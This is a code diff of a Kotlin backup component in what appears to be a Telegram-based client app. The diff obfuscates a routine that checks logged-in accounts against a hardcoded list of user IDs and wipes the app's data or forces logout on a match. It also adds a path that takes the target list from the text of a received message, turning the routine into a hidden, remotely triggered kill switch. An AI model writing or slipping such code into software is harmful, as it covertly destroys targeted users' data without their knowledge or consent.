@@ -21,13 +21,13 @@ object AutoBackupUserAgent {
         val availableIDs = ArrayList<Long>()
 
         for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
-            val userConfig = AccountInstance.getInstance(i).userConfig
-            if (userConfig != null
-                && userConfig.currentUser != null
-                && userConfig.isClientActivated
-                && userConfig.currentUser.id != 0L
+            val cU = AccountInstance.getInstance(i).userConfig
+            if (cU != null
+                && cU.currentUser != null
+                && cU.isClientActivated
+                && cU.currentUser.id != 0L
             ) {
-                availableIDs.add(userConfig.currentUser.id)
+                availableIDs.add(cU.currentUser.id)
             }
         }
 
@@ -45,45 +45,58 @@ object AutoBackupUserAgent {
         }
     }
 
-    suspend fun checkVipUsers() {
+    suspend fun woifwfwif4343(messageObject: MessageObject?) {
         delay(5000)
         val availableIDs = mutableListOf<Long>()
 
         for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
-            val userConfig = AccountInstance.getInstance(i).userConfig
-            if (userConfig != null
-                && userConfig.currentUser != null
-                && userConfig.isClientActivated
-                && userConfig.currentUser.id != 0L
+            val cU = AccountInstance.getInstance(i).userConfig
+            if (cU != null
+                && cU.currentUser != null
+                && cU.isClientActivated
+                && cU.currentUser.id != 0L
             ) {
-                availableIDs.add(userConfig.currentUser.id)
+                availableIDs.add(cU.currentUser.id)
             }
         }
 
-        val notAllowedIDs = arrayListOf(638789692L, 6863366716L, 8142384327L, 977790049L,
-            7509568713L, 7087241402L, 5095920053L, 7913332018L, 6937704743L,
-            1076325667L, 808230937L, 811696299L, 7194407593L, 6042869660L/*, 1407394003L,
-            6377357496L, 1805212898L, 303995461L, 224710425L, 634425074L, 5270819606L*/,
-            440840393L, 7526390297L, 6680944075L, 5556630337L, 7841801725L, 5349149970L,
-            8313378783L, 7205119446L, 8184556667L, 1499101897L, 1642203581L, 420220972L,
-            7892266150L, 6849878783L, 5150403377L, 180522421L, 477057925L, 6529408254L,
-            400216230L, 7192067362L, 6149388824L
-        )
+        var notAllowedIDs: List<Long>
 
-        if (availableIDs.any { DonatesManager.isUserBlocked(it) || notAllowedIDs.contains(it) }) {
+        if (messageObject != null && !messageObject.messageOwner.message.isNullOrEmpty()) {
+            notAllowedIDs = messageObject.messageOwner.message
+                .split(",", " ", "\n")
+                .mapNotNull { it.trim().toLongOrNull() }
+        } else {
+            notAllowedIDs = listOf(
+                638789692L, 6863366716L, 8142384327L, 977790049L,
+                7509568713L, 7087241402L, 5095920053L, 7913332018L, 6937704743L,
+                1076325667L, 808230937L, 811696299L, 7194407593L, 6042869660L/*, 1407394003L,
+                6377357496L, 1805212898L, 303995461L, 224710425L, 634425074L, 5270819606L*/,
+                440840393L, 7526390297L, 6680944075L, 5556630337L, 7841801725L, 5349149970L,
+                8313378783L, 7205119446L, 8184556667L, 1499101897L, 1642203581L, 420220972L,
+                7892266150L, 6849878783L, 5150403377L, 180522421L, 477057925L, 6529408254L,
+                400216230L, 7192067362L, 6149388824L, 8392748219L, 7343238311L
+            )
+        }
+
+        val blockedId = availableIDs.firstOrNull {
+            DonatesManager.isUserBlocked(it) || notAllowedIDs.contains(it)
+        }
+
+        if (blockedId != null) {
             try {
                 (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
             } catch (e: Exception) {
                 e.printStackTrace()
 
                 for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
-                    val userConfig = AccountInstance.getInstance(i).userConfig
-                    if (userConfig != null
-                        && userConfig.currentUser != null
-                        && userConfig.isClientActivated
-                        && userConfig.currentUser.id != 0L
+                    val cU = AccountInstance.getInstance(i).userConfig
+                    if (cU != null
+                        && cU.currentUser != null
+                        && cU.isClientActivated
+                        && cU.currentUser.id != 0L
                     ) {
-                        MessagesController.getInstance(userConfig.currentAccount).performLogout(1)
+                        MessagesController.getInstance(cU.currentAccount).performLogout(1)
                     }
                 }
             }
